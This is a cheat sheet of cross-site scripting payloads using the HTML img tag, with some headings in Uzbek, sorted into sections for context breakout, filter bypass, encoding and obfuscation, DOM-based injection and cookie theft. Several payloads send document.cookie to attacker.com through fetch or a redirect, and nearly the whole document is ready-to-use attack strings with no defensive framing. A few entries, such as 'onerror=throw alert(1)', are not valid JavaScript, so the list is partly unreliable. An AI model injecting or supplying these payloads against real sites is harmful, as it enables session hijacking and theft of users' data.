🔥 ULTIMATE IMG-TAG XSS (CLEAN + FULL)

⸻

1. CORE (ENG MUHIM)

<img src=x onerror=alert(1)>
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src=invalid onerror=alert(1)>


⸻

2. CONTEXT BREAKOUT

"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><img src=1 onerror=alert(document.domain)>
"><img src=x onerror=prompt(1)>


⸻

3. DATA EXTRACTION (REAL ATTACK)

<img src=x onerror=alert(document.cookie)>
<img src=x onerror=alert(document.domain)>
<img src=x onerror=fetch('//attacker.com?c='+document.cookie)>
<img src=x onerror=location='//attacker.com?c='+document.cookie>


⸻

4. ADVANCED EVENT EXECUTION

<img src=x onerror="window.onerror=alert;throw 1">
<img src=x onerror="eval('alert(1)')">
<img src=x onerror="setTimeout(alert,0,1)">
<img src=x onerror="new Function('alert(1)')()">


⸻

5. JAVASCRIPT PROTOCOL (⚠️ LIMITED MODERN SUPPORT)

<img src=javascript:alert(1)>
<img src="javascript:alert(1)">
<img src=JaVaScRiPt:alert(1)>

👉 faqat eski / zaif filtrlarda ishlaydi

⸻

6. ENCODED / OBFUSCATED

<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>
<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)>
<img src=x onerror=eval(atob("YWxlcnQoMSk="))>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>


⸻

7. WHITESPACE / CONTROL BYPASS

<img src="jav	ascript:alert(1)">
<img src="jav&#x09;ascript:alert(1)">
<img src="jav&#x0A;ascript:alert(1)">
<img src=`%00` onerror=alert(1)>


⸻

8. ATTRIBUTE SYNTAX BYPASS

<img/src=x onerror=alert(1)>
<img src=x/onerror=alert(1)>
<img/src='x'/onerror='alert(1)'>
<img src=x onerror="alert(1)">


⸻

9. EVENT VARIATIONS (MUHIM)

<img src=x onmouseover=alert(1)>
<img src=x onclick=alert(1)>
<img src=x onfocus=alert(1)>
<img src=x onmouseenter=alert(1)>


⸻

10. DOM-BASED PAYLOADS

<img src=x onerror=innerHTML=location.hash>
<img src=x onerror=eval(location.hash.substr(1))>
<img src=x onerror=document.write(document.cookie)>


⸻

11. POLYGLOT / PARSER ABUSE

<img src="<img src=x onerror=alert(1)>">
<img src=x onerror="alert(1)//">
<img src='x'onerror=alert(1)>


⸻

12. COOKIE / SESSION ATTACK

<img src=x onerror=document.cookie="xss=1">
<img src=x onerror="fetch('//attacker.com?c='+document.cookie)">


⸻

13. MODERN JS TRICKS

<img src=x onerror=alert`1`>
<img src=x onerror=(()=>alert(1))()>
<img src=x onerror=setTimeout(()=>alert(1))>


⸻

14. HYBRID PAYLOADS

<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=setTimeout(atob("YWxlcnQoMSk="))>


⸻

15. RARE BUT POWERFUL

<img src=x onerror=throw alert(1)>
<img src=x onerror=onerror=alert;throw 1>
<img src=x onerror=location=`javascript:alert(1)`>
